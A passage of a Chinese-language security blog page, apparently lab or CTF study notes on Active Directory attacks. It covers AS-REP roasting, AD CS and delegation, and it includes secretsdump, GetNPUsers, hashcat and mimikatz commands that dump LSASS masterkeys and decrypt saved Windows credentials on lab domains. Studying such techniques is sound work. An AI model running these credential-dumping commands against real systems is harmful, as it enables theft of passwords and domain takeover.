+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">proxychains python secretsdump.py -no-pass cyberstrikelab.com/DC\$@10.0.0.60
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="as-rep-roasting">AS-REP-Roasting
+</h3><p>一种针对 Kerberos 协议的攻击技术，主要针对域内<strong>配置不当的用户账户</strong>。它的门槛极低，甚至不需要拿到任何域用户的权限（只要你知道受害者的用户名），就可以离线破解其密码。</p>
+<p>在数据库中获取到大量用户名时可以考虑用<code>impacket</code>的<code>GetNPUsers.py</code>对没开启域身份证明的读取哈希</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile users.txt xiaorang.lab/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后对读出来的哈希做哈希爆破（rockyou是个爆破字典）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hashcat -m 18200 -a 0 --force  hash.txt rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><code>-m 18200</code> (命令 2)</strong></p>
+<ul>
+<li><strong>协议/类型</strong>: <strong>Kerberos 5, AS-REP etype 23</strong></li>
+<li><strong>攻击名称</strong>: <strong>AS-REP Roasting</strong></li>
+<li><strong>目标</strong>: 此攻击针对的是设置了**&ldquo;Do not require Kerberos preauthentication&rdquo;**（不需要 Kerberos 预认证）的用户账户。</li>
+<li><strong>原理</strong>: 攻击者向域控请求认证（AS-REQ），如果目标用户不需要预认证，域控会直接返回一个用该用户密码哈希加密的 TGT 部分（AS-REP）。攻击者离线破解它来获取用户密码。</li>
+</ul>
+<h3 id="ad-cs">AD-CS
+</h3><p><strong>AD CS</strong> 是微软提供的公钥基础设施（PKI）实现。它允许组织在 Active Directory 环境中颁发和管理数字证书。</p>
+<p>如果攻击者获得了一个用于“客户端身份验证”的有效证书，Active Directory 就会把这个证书等同于用户的密码或 Kerberos Ticket。也就是说，你可以申请一个域控管理员的证书，然后通过这个证书获取域控管理员的哈希</p>
+<p>在你拥有一个域内账号/密码时，可以尝试进行攻击的一个漏洞</p>
+<p>存在<code>ESC1~8</code>时八种不一样的漏洞，但是都是可以获取证书的</p>
+<h3 id="dpapi凭据解密">DPAPI凭据解密
+</h3><p>DPAPI（Data Protection Application Programming Interface）是Windows操作系统提供的一套数据保护API，从Windows 2000开始引入。它为应用程序提供了简单的加密/解密接口，开发者无需自行管理密钥。</p>
+<p>比如浏览器的是否保存密码，就会产生这种凭据，还有RDP登录时，选择记住凭据后就会有这种凭据</p>
+<p>首先要找到凭据的位置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Windows凭据管理器存储位置有两个：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users\&lt;用户名&gt;\AppData\Local\Microsoft\Credentials\
+</span></span><span class="line"><span class="cl">  └── 存储&#34;本地&#34;凭据（如RDP保存的密码、网络共享凭据等）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users\&lt;用户名&gt;\AppData\Roaming\Microsoft\Credentials\
+</span></span><span class="line"><span class="cl">  └── 存储&#34;漫游&#34;凭据（域环境中可随用户漫游）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后用mimikatz的<code>dpapi</code>模块分析一下，从而获取guidMasterKey</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz.exe &#34;dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\811292CB3B95926F7EA2D46FEB2A7ADB&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//guidMasterKey : {0792c32e-48a5-4fe3-8b43-d93d64590580}
+</span></span><span class="line"><span class="cl">//解密这个凭据需要找到 GUID = 0792c32e-48a5-... 的Master Key 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么接下来就是从LSASS进程内存中导出所有MasterKey</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::dpapi&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//进程内存中提取DPAPI信息
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找到对应的MasterKey后就可以开始解密了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz.exe &#34;dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\811292CB3B95926F7EA2D46FEB2A7ADB /masterkey:24b089facc24b9f698931a52411c777ed146efe5f0248fd0d4b1844f1d441b9970ad86c006627e49b0e8c94179f0b4a8f509f9d8af5af3569faa21d9c56068a9&#34; &#34;exit&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="约束性委派">约束性委派
+</h3><p>委派（Delegation）是 Active Directory 中的一种信任机制，允许服务账户<strong>代表用户</strong>访问其他服务。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用户 → Web服务器（前端服务） → 数据库服务器（后端服务）
+</span></span><span class="line"><span class="cl">                 
+</span></span><span class="line"><span class="cl">         
+</span></span><span class="line"><span class="cl">用户访问 Web 服务器，Web 服务器需要以用户的身份去后端数据库查询数据，这就需要委派。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>引入版本</th>
+<th>安全性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>非约束性委派 (Unconstrained Delegation)</td>
+<td>Windows 2000</td>
+<td>最低</td>
+</tr>
+<tr>
+<td>约束性委派 (Constrained Delegation)</td>
+<td>Windows 2003</td>
+<td>中等</td>
+</tr>
+<tr>
+<td>基于资源的约束性委派 (RBCD)</td>
+<td>Windows 2012</td>
+<td>较高</td>
+</tr>
+</tbody>
+</table></div>
+<p>非约束性委派是最早引入的委派方式（Windows 2000 开始）。</p>
+<p><strong>核心特征：</strong> 被配置了非约束性委派的服务账户，可以<strong>模拟任何用户</strong>访问<strong>任何服务</strong>。</p>
+<p>一般是配合Printer Bug（打印机漏洞）获取域控TGT</p>
+<h3 id="非约束性委派">非约束性委派
+</h3>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/awdawdp%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWD|AWDP从零到一</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%87%AA%E4%B8%BB%E7%A0%94%E7%A9%B6%E6%96%B0%E5%8F%91%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">自主研究新发现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nodejs/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NodeJS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
